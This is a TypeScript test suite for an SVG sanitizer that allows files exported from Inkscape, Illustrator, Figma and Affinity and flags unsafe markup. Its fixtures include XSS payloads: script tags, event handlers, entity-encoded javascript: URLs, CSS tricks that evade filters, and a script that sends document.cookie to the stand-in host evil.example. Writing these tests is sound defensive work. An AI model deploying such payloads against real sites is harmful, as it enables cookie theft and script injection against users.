import { describe, expect, test } from 'bun:test';

import {
  checkSvgSyntax,
  SVG_MAX_NESTED_TAGS,
} from '../../../lib/core/media/svg-syntax.ts';
import {
  inspectSvg,
  SVG_MAX_RECORDED_VIOLATIONS,
  type SvgViolation,
} from './svg-allowlist.ts';

const PNG_DATA =
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGP4z8DwHwAFAAH/iZk9HQAAAABJRU5ErkJggg==';

const svg = (body: string, attributes = ''): string =>
  `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"${attributes}>${body}</svg>`;

const violationsOf = (text: string): readonly SvgViolation[] => {
  const result = inspectSvg(text);
  return result.ok ? [] : result.violations;
};

const INKSCAPE_SAMPLE = `<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   width="210mm"
   height="297mm"
   viewBox="0 0 210 297"
   version="1.1"
   id="svg1"
   inkscape:version="1.3.2 (091e20e, 2023-11-25)"
   sodipodi:docname="logo.svg"
   inkscape:export-filename="logo.png"
   inkscape:export-xdpi="96"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:dc="http://purl.org/dc/elements/1.1/">
  <sodipodi:namedview
     id="namedview1"
     pagecolor="#ffffff"
     bordercolor="#000000"
     borderopacity="0.25"
     inkscape:showpageshadow="2"
     inkscape:pageopacity="0.0"
     inkscape:pagecheckerboard="0"
     inkscape:deskcolor="#d1d1d1"
     inkscape:document-units="mm"
     inkscape:zoom="0.7"
     inkscape:current-layer="layer1">
    <inkscape:grid id="grid1" units="mm" originx="0" originy="0" spacingx="1" spacingy="1" empcolor="#0099e5" color="#0099e5" visible="false" />
    <inkscape:page x="0" y="0" width="210" height="297" id="page1" margin="0" bleed="0" />
  </sodipodi:namedview>
  <defs id="defs1">
    <linearGradient id="linearGradient2" inkscape:collect="always">
      <stop style="stop-color:#ff0000;stop-opacity:1;" offset="0" id="stop1" />
      <stop style="stop-color:#ff0000;stop-opacity:0;" offset="1" id="stop2" />
    </linearGradient>
    <linearGradient inkscape:collect="always" xlink:href="#linearGradient2" id="linearGradient3" x1="20" y1="50" x2="70" y2="50" gradientUnits="userSpaceOnUse" />
    <filter style="color-interpolation-filters:sRGB" inkscape:label="Drop Shadow" id="filter1" x="-0.1" y="-0.1" width="1.2" height="1.2">
      <feFlood result="flood" in="SourceGraphic" flood-opacity="0.5" flood-color="rgb(0,0,0)" id="feFlood1" />
      <feGaussianBlur result="blur" in="SourceGraphic" stdDeviation="2" id="feGaussianBlur1" />
      <feOffset result="offset" in="blur" dx="2" dy="2" id="feOffset1" />
      <feComposite result="comp1" operator="in" in="flood" in2="offset" id="feComposite1" />
      <feComposite result="comp2" operator="over" in="SourceGraphic" in2="comp1" id="feComposite2" />
    </filter>
    <inkscape:path-effect effect="spiro" id="path-effect1" is_visible="true" lpeversion="1" />
  </defs>
  <metadata id="metadata1">
    <rdf:RDF>
      <cc:Work rdf:about="">
        <dc:format>image/svg+xml</dc:format>
        <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
        <dc:title>ロゴ</dc:title>
        <cc:license rdf:resource="http://creativecommons.org/licenses/by/4.0/" />
      </cc:Work>
    </rdf:RDF>
  </metadata>
  <g inkscape:label="レイヤー 1" inkscape:groupmode="layer" id="layer1">
    <rect style="fill:url(#linearGradient3);stroke-width:0.264583;filter:url(#filter1)" id="rect1" width="50" height="40" x="20" y="30" />
    <path style="fill:none;stroke:#000000;stroke-width:0.264583px" d="m 20,100 c 10,-10 20,10 30,0" id="path1" inkscape:path-effect="#path-effect1" inkscape:original-d="m 20,100 c 10,-10 20,10 30,0" sodipodi:nodetypes="cc" inkscape:connector-curvature="0" />
    <circle style="fill:#00ff00" id="path2" cx="100" cy="100" r="10" />
    <path sodipodi:type="arc" sodipodi:cx="150" sodipodi:cy="100" sodipodi:rx="10" sodipodi:ry="10" sodipodi:start="0" sodipodi:end="3.1" sodipodi:arc-type="arc" sodipodi:open="true" d="m 160,100 a 10,10 0 0 1 -10,10" id="path3" />
    <text xml:space="preserve" style="font-size:10.5833px;line-height:1.25;font-family:'Noto Sans JP';stroke-width:0.264583" x="20" y="150" id="text1"><tspan sodipodi:role="line" id="tspan1" style="stroke-width:0.264583" x="20" y="150">ローンチ</tspan></text>
    <image width="10" height="10" preserveAspectRatio="none" style="image-rendering:optimizeSpeed" xlink:href="data:image/png;base64,${PNG_DATA}" id="image1" x="20" y="200" sodipodi:absref="/home/user/pixel.png" />
  </g>
</svg>
`;

const ILLUSTRATOR_EXPORT_SAMPLE = `<?xml version="1.0" encoding="UTF-8"?>
<svg id="_レイヤー_1" data-name="レイヤー 1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 120 40">
  <defs>
    <style>
      .cls-1 {
        fill: url(#_名称未設定グラデーション_3);
      }

      .cls-2 {
        fill: #e60012;
        font-family: KozGoPr6N-Bold-90ms-RKSJ-H, 'Kozuka Gothic Pr6N';
        font-size: 12px;
        font-weight: 700;
      }

      .cls-3 {
        clip-path: url(#clippath);
      }
    </style>
    <clipPath id="clippath">
      <rect width="120" height="40"/>
    </clipPath>
    <linearGradient id="_名称未設定グラデーション_3" data-name="名称未設定グラデーション 3" x1="0" y1="20" x2="40" y2="20" gradientUnits="userSpaceOnUse">
      <stop offset="0" stop-color="#fff"/>
      <stop offset="1" stop-color="#000"/>
    </linearGradient>
  </defs>
  <g class="cls-3">
    <circle class="cls-1" cx="20" cy="20" r="18"/>
    <text class="cls-2" transform="translate(44 24)"><tspan x="0" y="0">Launch</tspan></text>
    <polygon points="100 5 115 35 85 35 100 5" fill="#036eb8"/>
  </g>
</svg>`;

const ILLUSTRATOR_SAVE_AS_SAMPLE = `<?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 28.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg version="1.1" id="レイヤー_1" xmlns:x="http://ns.adobe.com/Extensibility/1.0/" xmlns:i="http://ns.adobe.com/AdobeIllustrator/10.0/" xmlns:graph="http://ns.adobe.com/Graphs/1.0/"
	 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 100 100"
	 style="enable-background:new 0 0 100 100;" xml:space="preserve" i:viewOrigin="0 100" i:rulerOrigin="0 0" i:pageBounds="0 100 100 0">
<style type="text/css">
	.st0{fill:url(#SVGID_1_);}
	.st1{fill:none;stroke:#231815;stroke-miterlimit:10;}
</style>
<metadata>
	<x:xmpmeta x:xmptk="Adobe XMP Core 9.0">
		<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
			<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">
				<dc:format>image/svg+xml</dc:format>
			</rdf:Description>
		</rdf:RDF>
	</x:xmpmeta>
</metadata>
<g i:layer="yes" i:dimmedPercent="50" i:rgbTrio="#4F008000FFFF" id="レイヤー_1_1_">
	<linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="10" y1="50" x2="90" y2="50" gradientTransform="matrix(1 0 0 -1 0 100)">
		<stop  offset="0" style="stop-color:#FFFFFF"/>
		<stop  offset="1" style="stop-color:#000000"/>
	</linearGradient>
	<rect x="10" y="10" class="st0" width="80" height="80"/>
	<line class="st1" x1="10" y1="10" x2="90" y2="90"/>
	<g graph:type="bar" i:extraneous="self">
		<ellipse cx="50" cy="50" rx="20" ry="10"/>
	</g>
</g>
</svg>
`;

const FIGMA_SAMPLE = `<svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g clip-path="url(#clip0_12_34)">
<g filter="url(#filter0_d_12_34)">
<rect x="4" y="4" width="56" height="56" rx="12" fill="#5B5BD6"/>
</g>
<mask id="mask0_12_34" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="8" y="8" width="48" height="48">
<circle cx="32" cy="32" r="24" fill="#D9D9D9"/>
</mask>
<g mask="url(#mask0_12_34)">
<rect x="8" y="8" width="48" height="48" fill="url(#pattern0_12_34)"/>
</g>
<path fill-rule="evenodd" clip-rule="evenodd" d="M32 16L48 48H16L32 16Z" fill="url(#paint0_linear_12_34)" fill-opacity="0.8" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<defs>
<filter id="filter0_d_12_34" x="0" y="4" width="64" height="64" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
<feFlood flood-opacity="0" result="BackgroundImageFix"/>
<feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"/>
<feOffset dy="4"/>
<feGaussianBlur stdDeviation="2"/>
<feComposite in2="hardAlpha" operator="out"/>
<feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.25 0"/>
<feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_12_34"/>
<feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_12_34" result="shape"/>
</filter>
<pattern id="pattern0_12_34" patternContentUnits="objectBoundingBox" width="1" height="1">
<use xlink:href="#image0_12_34" transform="scale(0.01)"/>
</pattern>
<linearGradient id="paint0_linear_12_34" x1="32" y1="16" x2="32" y2="48" gradientUnits="userSpaceOnUse">
<stop stop-color="#FFB224"/>
<stop offset="1" stop-color="#F76808" stop-opacity="0"/>
</linearGradient>
<clipPath id="clip0_12_34">
<rect width="64" height="64" fill="white"/>
</clipPath>
<image id="image0_12_34" width="100" height="100" preserveAspectRatio="none" xlink:href="data:image/png;base64,${PNG_DATA}"/>
</defs>
</svg>
`;

const AFFINITY_SAMPLE = `<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="100%" height="100%" viewBox="0 0 200 100" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" xmlns:serif="http://www.serif.com/" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:2;">
    <g id="Artboard1" serif:id="Artboard 1" transform="matrix(1,0,0,1,0,0)">
        <rect x="0" y="0" width="200" height="100" style="fill:none;"/>
        <clipPath id="_clip1">
            <rect x="0" y="0" width="200" height="100"/>
        </clipPath>
        <g clip-path="url(#_clip1)">
            <g id="Layer1" serif:id="Layer 1">
                <path d="M100,10L190,90L10,90L100,10Z" style="fill:url(#_Linear2);stroke:rgb(35,24,21);stroke-width:2px;"/>
                <g transform="matrix(1,0,0,1,20,20)">
                    <use xlink:href="#_Image3" x="0" y="0" width="10px" height="10px"/>
                </g>
                <text x="60px" y="60px" style="font-family:'NotoSansJP-Bold', 'Noto Sans JP';font-weight:700;font-size:12px;">ロゴ</text>
            </g>
        </g>
    </g>
    <defs>
        <linearGradient id="_Linear2" x1="0" y1="0" x2="1" y2="0" gradientUnits="userSpaceOnUse" gradientTransform="matrix(180,0,0,180,10,50)"><stop offset="0" style="stop-color:rgb(255,0,0);stop-opacity:1"/><stop offset="1" style="stop-color:rgb(0,0,255);stop-opacity:1"/></linearGradient>
        <image id="_Image3" width="10px" height="10px" xlink:href="data:image/png;base64,${PNG_DATA}"/>
    </defs>
</svg>
`;

describe('inspectSvg の編集ソフトの書き出しの標本', () => {
  test.each([
    ['Inkscape 1.x', INKSCAPE_SAMPLE],
    ['Illustratorの書き出し', ILLUSTRATOR_EXPORT_SAMPLE],
    [
      'Illustratorの別名で保存(実体の参照を展開した形)',
      ILLUSTRATOR_SAVE_AS_SAMPLE,
    ],
    ['Figma', FIGMA_SAMPLE],
    ['Affinity Designer(SVG 1.1の文書型宣言を含む形)', AFFINITY_SAMPLE],
  ])('%sの書き出しは受付を通り、許可される', (_, sample) => {
    expect(checkSvgSyntax(new TextEncoder().encode(sample)).ok).toBe(true);
    expect(inspectSvg(sample)).toEqual({ ok: true });
  });
});

describe('inspectSvg の要素', () => {
  test.each([
    'script',
    'foreignObject',
    'iframe',
    'object',
    'embed',
    'a',
    'animate',
    'animateTransform',
    'animateMotion',
    'set',
    'feImage',
    'handler',
    'listener',
    'discard',
    'font-face',
  ])('%sは許可されない要素として記録される', (name) => {
    expect(violationsOf(svg(`<${name}/>`))).toEqual([
      { kind: 'disallowed-element', target: name },
    ]);
  });

  test('アニメーションによる属性の書き換えは要素と許可外の属性として記録される', () => {
    expect(
      violationsOf(
        svg(
          '<a href="#target"><set attributeName="href" to="javascript:alert(1)" begin="0s"/><animate attributeName="fill" values="red;blue" dur="1s"/></a>',
        ),
      ),
    ).toEqual([
      { kind: 'disallowed-element', target: 'a' },
      { kind: 'disallowed-element', target: 'set' },
      { kind: 'disallowed-attribute', target: 'attributeName' },
      { kind: 'disallowed-attribute', target: 'to' },
      { kind: 'external-reference', target: 'to' },
      { kind: 'disallowed-attribute', target: 'begin' },
      { kind: 'disallowed-element', target: 'animate' },
      { kind: 'disallowed-attribute', target: 'dur' },
    ]);
  });

  test('接頭辞をSVGの名前空間へ結び付けた要素はSVGの要素として検査される', () => {
    expect(
      violationsOf(
        svg(
          '<inkscape:script xmlns:inkscape="http://www.w3.org/2000/svg"/><svg:rect xmlns:svg="http://www.w3.org/2000/svg" width="1" height="1"/>',
        ),
      ),
    ).toEqual([{ kind: 'disallowed-element', target: 'inkscape:script' }]);
  });

  test('既定の名前空間をXHTMLにした文書の要素は許可されない', () => {
    expect(
      violationsOf(
        '<svg xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></svg>',
      ),
    ).toEqual([
      { kind: 'disallowed-element', target: 'svg' },
      { kind: 'disallowed-element', target: 'script' },
    ]);
  });

  test('宣言されていない接頭辞と編集ソフト以外の名前空間の要素は許可されない', () => {
    expect(
      violationsOf(
        svg(
          '<foo:bar/><h:div xmlns:h="http://www.w3.org/1999/xhtml"/><m:math xmlns:m="http://www.w3.org/1998/Math/MathML"/>',
        ),
      ),
    ).toEqual([
      { kind: 'disallowed-element', target: 'foo:bar' },
      { kind: 'disallowed-element', target: 'h:div' },
      { kind: 'disallowed-element', target: 'm:math' },
    ]);
  });

  test('編集ソフトの名前空間の要素の中のSVGの要素も検査される', () => {
    expect(
      violationsOf(
        svg(
          '<metadata><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><script/></rdf:RDF></metadata>',
        ),
      ),
    ).toEqual([{ kind: 'disallowed-element', target: 'script' }]);
  });

  test('名前空間を持たない文書の要素もSVGの許可リストで検査される', () => {
    expect(violationsOf('<svg><rect width="1" height="1"/></svg>')).toEqual([]);
    expect(violationsOf('<svg><script/></svg>')).toEqual([
      { kind: 'disallowed-element', target: 'script' },
    ]);
  });
});

describe('inspectSvg の属性', () => {
  test.each(['onload', 'onclick', 'OnMouseOver', 'onbegin'])(
    '%sはイベント属性として記録される',
    (name) => {
      expect(violationsOf(svg('', ` ${name}="alert(1)"`))).toEqual([
        { kind: 'event-attribute', target: name },
      ]);
    },
  );

  test('編集ソフトの名前空間のonで始まる属性もイベント属性として記録される', () => {
    expect(
      violationsOf(
        svg(
          '<g inkscape:onclick="x" serif:onload="y" inkscape:label="ok"/>',
          ' xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" xmlns:serif="http://www.serif.com/"',
        ),
      ),
    ).toEqual([
      { kind: 'event-attribute', target: 'inkscape:onclick' },
      { kind: 'event-attribute', target: 'serif:onload' },
    ]);
  });

  test('編集ソフトの名前空間の要素の接頭辞の無いonで始まる属性もイベント属性として記録される', () => {
    expect(
      violationsOf(
        svg(
          '<sodipodi:namedview pagecolor="#fff" onload="x"/>',
          ' xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"',
        ),
      ),
    ).toEqual([{ kind: 'event-attribute', target: 'onload' }]);
  });

  test('許可リストに無い属性は許可されない属性として記録される', () => {
    expect(
      violationsOf(
        svg(
          '<rect width="1" height="1" formaction="x" xml:base="https://evil.example/" xlink:title="t" contentScriptType="text/ecmascript"/>',
        ),
      ),
    ).toEqual([
      { kind: 'disallowed-attribute', target: 'formaction' },
      { kind: 'disallowed-attribute', target: 'xml:base' },
      { kind: 'disallowed-attribute', target: 'xlink:title' },
      { kind: 'disallowed-attribute', target: 'contentScriptType' },
    ]);
  });

  test('編集ソフト以外の名前空間の属性は許可されない', () => {
    expect(
      violationsOf(
        svg(
          '<rect width="1" height="1" h:style="x" foo:bar="y"/>',
          ' xmlns:h="http://www.w3.org/1999/xhtml"',
        ),
      ),
    ).toEqual([
      { kind: 'disallowed-attribute', target: 'h:style' },
      { kind: 'disallowed-attribute', target: 'foo:bar' },
    ]);
  });

  test('data-で始まる属性・xml:space・xml:lang・名前空間の宣言は許可される', () => {
    expect(
      violationsOf(
        svg(
          '<g data-name="レイヤー 1" xml:space="preserve" xml:lang="ja" xmlns:dc="http://purl.org/dc/elements/1.1/"/>',
        ),
      ),
    ).toEqual([]);
  });
});

describe('inspectSvg の参照', () => {
  test.each([
    ['href', '#a'],
    ['xlink:href', '#a'],
    ['href', '&#9; #a &#10;'],
    ['href', '&#35;a'],
    ['href', '&#x23;a'],
  ])('%sの文書内の断片は許可される', (name, value) => {
    expect(violationsOf(svg(`<use ${name}="${value}"/>`))).toEqual([]);
  });

  test.each([
    ['href', 'https://evil.example/sprite.svg#a'],
    ['xlink:href', 'sprite.svg#a'],
    ['href', 'javascript:alert(1)'],
    ['href', ' javascript:alert(1)'],
    ['href', '&#106;avascript:alert(1)'],
    ['href', '&#x6A;avascript:alert(1)'],
    ['href', '&#0000106;&#97;vascript:alert(1)'],
    ['href', '&amp;#a'],
    ['href', '&#1114112;'],
    ['href', '&#9;&#10;'],
    ['href', 'java&#9;script:alert(1)'],
    ['xlink:href', '%23a'],
    ['href', '//evil.example/a.svg'],
    ['href', ''],
  ])('%s="%s"は外部の参照として記録される', (name, value) => {
    expect(violationsOf(svg(`<use ${name}="${value}"/>`))).toEqual([
      { kind: 'external-reference', target: name },
    ]);
  });

  test('SVGの名前空間へ結び付けた接頭辞の属性もSVGの属性として検査される', () => {
    expect(
      violationsOf(
        svg(
          '<use s:x="1" s:href="https://evil.example/a.svg#a" s:formaction="x" s:onload="y"/>',
          ' xmlns:s="http://www.w3.org/2000/svg"',
        ),
      ),
    ).toEqual([
      { kind: 'external-reference', target: 's:href' },
      { kind: 'disallowed-attribute', target: 's:formaction' },
      { kind: 'event-attribute', target: 's:onload' },
    ]);
  });

  test('XLinkの名前空間へ結び付けた別の接頭辞の参照も検査される', () => {
    expect(
      violationsOf(
        svg(
          '<use l:href="https://evil.example/a.svg#a"/>',
          ' xmlns:l="http://www.w3.org/1999/xlink"',
        ),
      ),
    ).toEqual([{ kind: 'external-reference', target: 'l:href' }]);
  });

  test.each([
    'fill',
    'stroke',
    'filter',
    'clip-path',
    'mask',
    'marker-start',
    'cursor',
  ])('%sの属性値のurl()の外部参照が記録される', (name) => {
    expect(
      violationsOf(
        svg(
          `<rect width="1" height="1" ${name}="url(https://evil.example/p.svg#g)"/>`,
        ),
      ),
    ).toEqual([{ kind: 'external-reference', target: name }]);
  });

  test.each([
    'fill:url(https://evil.example/p.svg#g)',
    "fill: URL( 'https://evil.example/p.svg#g' )",
    'fill:u\\72l(https://evil.example/p.svg#g)',
    'fill:#fff;cursor:url(cursor.png),auto',
    'background:expression(alert(1))',
    'background-image:url(javascript:alert(1))',
    'fill:&#117;rl(https://evil.example/p.svg#g)',
  ])('style属性の「%s」は外部の参照として記録される', (style) => {
    expect(
      violationsOf(svg(`<rect width="1" height="1" style="${style}"/>`)),
    ).toEqual([{ kind: 'external-reference', target: 'style' }]);
  });

  test.each([
    '@import url(https://evil.example/a.css);',
    '@import "https://evil.example/a.css";',
    '@\\69mport "a.css";',
    'rect{fill:url("https://evil.example/p.svg#g")}',
    '@font-face{font-family:x;src:url(https://evil.example/f.woff2)}',
    'svg{background-image:image-set("https://evil.example/t.png" 1x)}',
    'rect{width:expression(alert(1))}',
    '@font-face{font-family:x;src:src("https://evil.example/f.woff2")}',
  ])('style要素の「%s」は外部の参照として記録される', (css) => {
    expect(violationsOf(svg(`<style>${css}</style>`))).toEqual([
      { kind: 'external-reference', target: 'style' },
    ]);
  });

  test('CDATAに入れたstyle要素の中身も検査される', () => {
    expect(
      violationsOf(
        svg(
          '<style><![CDATA[ @import url(https://evil.example/a.css); ]]></style>',
        ),
      ),
    ).toEqual([{ kind: 'external-reference', target: 'style' }]);
  });

  test.each([
    [
      '文字列の中のコメントの開始',
      "font-family:'/*';fill:url(https://evil.example/a);font-family:'*/'",
    ],
    ['エスケープしたスラッシュ', '\\/*;fill:url(https://evil.example/a);x:*/'],
  ])('style属性の%sの後のurl()の外部参照も記録される', (_, style) => {
    expect(
      violationsOf(svg(`<rect width="1" height="1" style="${style}"/>`)),
    ).toEqual([{ kind: 'external-reference', target: 'style' }]);
  });

  test.each([
    [
      '文字列の中のコメントの開始',
      'text{font-family:"/*"} rect{fill:url(https://evil.example/a)} text{font-family:"*/"}',
    ],
    [
      'エスケープしたスラッシュ',
      '\\/*{} rect{fill:url(https://evil.example/a)} */',
    ],
    [
      'CDATAの中の文字参照',
      '<![CDATA[&#x2f;*{} rect{fill:url(https://evil.example/a)} */]]>',
    ],
  ])('style要素の%sの後のurl()の外部参照も記録される', (_, css) => {
    expect(violationsOf(svg(`<style>${css}</style>`))).toEqual([
      { kind: 'external-reference', target: 'style' },
    ]);
  });

  test('style要素の子の要素をまたいでつながる文字も検査される', () => {
    expect(
      violationsOf(
        svg('<style>rect{fill:url(<g/>https://evil.example/a)}</style>'),
      ),
    ).toEqual([{ kind: 'external-reference', target: 'style' }]);
  });

  // 文字列の中の関数のような書き方も描画器が解釈しないCSSとして保守側に記録するが、外部の参照にはしない
  test('CDATAの中の文字参照はブラウザと同じく戻さずに検査する', () => {
    expect(
      violationsOf(
        svg('<style><![CDATA[ text{font-family:"&#117;rl(x)"} ]]></style>'),
      ),
    ).toEqual([{ kind: 'unsupported-css', target: 'style' }]);
  });

  test('style要素とstyle属性の文書内の断片のurl()は許可される', () => {
    expect(
      violationsOf(
        svg(
          `<style>.a{fill:url(#g)}.b{fill:url( "#g" )}</style><rect width="1" height="1" class="a" style="filter:url('#f')"/>`,
        ),
      ),
    ).toEqual([]);
  });
});

describe('inspectSvg のdata URI', () => {
  test.each(['png', 'jpeg', 'gif', 'PNG'])(
    'image要素のimage/%sのbase64のdata URIは許可される',
    (type) => {
      expect(
        violationsOf(
          svg(
            `<image width="1" height="1" href="data:image/${type};base64,${PNG_DATA}"/><image width="1" height="1" xlink:href="data:image/${type};base64,${PNG_DATA}"/>`,
          ),
        ),
      ).toEqual([]);
    },
  );

  test.each([
    'data:image/svg+xml;base64,PHN2Zy8+',
    'data:image/svg+xml,%3Csvg%2F%3E',
    'data:text/html;base64,PHNjcmlwdD4=',
    'data:image/png,raw',
    'data:image/bmp;base64,Qk0=',
    'data:image/png;base64,%3Cscript%3E',
  ])('image要素の「%s」は許可外のdata URIとして記録される', (uri) => {
    expect(
      violationsOf(svg(`<image width="1" height="1" href="${uri}"/>`)),
    ).toEqual([{ kind: 'disallowed-data-uri', target: 'href' }]);
  });

  test('image要素以外の参照のdata URIは許可外のdata URIとして記録される', () => {
    expect(
      violationsOf(
        svg(`<use xlink:href="data:image/png;base64,${PNG_DATA}"/>`),
      ),
    ).toEqual([{ kind: 'disallowed-data-uri', target: 'xlink:href' }]);
  });

  test('url()のdata URIは許可外のdata URIとして記録される', () => {
    expect(
      violationsOf(
        svg(
          `<rect width="1" height="1" fill="url(data:image/png;base64,${PNG_DATA})"/>`,
        ),
      ),
    ).toEqual([{ kind: 'disallowed-data-uri', target: 'fill' }]);
  });
});

describe('inspectSvg の処理命令・宣言・解析の失敗', () => {
  test('XML宣言は許可される', () => {
    expect(
      violationsOf(`<?xml version="1.0" encoding="UTF-8"?>${svg('')}`),
    ).toEqual([]);
  });

  test('xml-stylesheetなどの処理命令は名前だけが記録される', () => {
    expect(
      violationsOf(
        `<?xml version="1.0"?><?xml-stylesheet type="text/css" href="https://evil.example/a.css"?>${svg('<?php echo 1; ?>')}`,
      ),
    ).toEqual([
      { kind: 'processing-instruction', target: 'xml-stylesheet' },
      { kind: 'processing-instruction', target: 'php' },
    ]);
  });

  test('DOCTYPEとENTITYの宣言は宣言として記録される', () => {
    expect(
      violationsOf(
        `<!DOCTYPE svg [<!ENTITY a "b">]>${svg('<text>&a;</text>')}`,
      ),
    ).toEqual([
      { kind: 'declaration', target: 'DOCTYPE' },
      { kind: 'declaration', target: 'ENTITY' },
    ]);
  });

  test.each([
    ['引用符を閉じていない属性', '<svg><g x="1></g></svg>'],
    ['JavaScriptの予約された名前の属性', '<svg constructor="x"></svg>'],
  ])('%sは解析できないとして記録される', (_, text) => {
    expect(violationsOf(text)).toEqual([{ kind: 'unparseable', target: '' }]);
  });

  test.each([
    SVG_MAX_NESTED_TAGS,
    SVG_MAX_NESTED_TAGS + 1,
    SVG_MAX_NESTED_TAGS + 2,
  ])('入れ子の深さ%iは受付で通る場合に限り解析できる', (depth) => {
    const text = `<svg xmlns="http://www.w3.org/2000/svg">${'<g>'.repeat(depth - 1)}${'</g>'.repeat(depth - 1)}</svg>`;

    const accepted = checkSvgSyntax(new TextEncoder().encode(text)).ok;

    expect(inspectSvg(text)).toEqual(
      accepted
        ? { ok: true }
        : { ok: false, violations: [{ kind: 'unparseable', target: '' }] },
    );
  });

  test('入れ子の上限を超えた文書は解析できない', () => {
    const depth = SVG_MAX_NESTED_TAGS + 2;
    const text = `<svg xmlns="http://www.w3.org/2000/svg">${'<g>'.repeat(depth - 1)}${'</g>'.repeat(depth - 1)}</svg>`;

    expect(violationsOf(text)).toEqual([{ kind: 'unparseable', target: '' }]);
  });
});

describe('inspectSvg の記録', () => {
  test('違反は要素名と属性名だけが記録され、値と中身は記録されない', () => {
    const result = inspectSvg(
      svg(
        '<script>fetch("https://evil.example/?c="+document.cookie)</script><rect width="1" height="1" onclick="steal(secret)"/><use href="https://evil.example/token-value"/>',
      ),
    );

    expect(result).toEqual({
      ok: false,
      violations: [
        { kind: 'disallowed-element', target: 'script' },
        { kind: 'event-attribute', target: 'onclick' },
        { kind: 'external-reference', target: 'href' },
      ],
    });
    const recorded = JSON.stringify(result);
    expect(recorded).not.toContain('evil.example');
    expect(recorded).not.toContain('cookie');
    expect(recorded).not.toContain('secret');
  });

  test('同じ種類と名前の違反は1件にまとめられる', () => {
    expect(
      violationsOf(
        svg(
          '<script/><g><script/></g><rect width="1" height="1" onclick="a"/><circle r="1" onclick="b"/>',
        ),
      ),
    ).toEqual([
      { kind: 'disallowed-element', target: 'script' },
      { kind: 'event-attribute', target: 'onclick' },
    ]);
  });

  test('記録する違反は先頭から上限の件数までに切り詰められる', () => {
    const names = Array.from(
      { length: SVG_MAX_RECORDED_VIOLATIONS + 10 },
      (_, index) => `unknown${String(index)}`,
    );

    const violations = violationsOf(
      svg(names.map((name) => `<${name}/>`).join('')),
    );

    expect(violations).toEqual(
      names
        .slice(0, SVG_MAX_RECORDED_VIOLATIONS)
        .map((target) => ({ kind: 'disallowed-element', target })),
    );
  });

  // 解析器はObjectのプロトタイプと同じ名前を`__`付きの名前へ変えるため、記録される名前は文書の名前と異なる
  test('Objectのプロトタイプと同じ名前の要素と属性は解析器が変えた名前で記録される', () => {
    expect(violationsOf(svg('<toString valueOf="1"/>'))).toEqual([
      { kind: 'disallowed-element', target: '__toString' },
      { kind: 'disallowed-attribute', target: '__valueOf' },
    ]);
  });
});
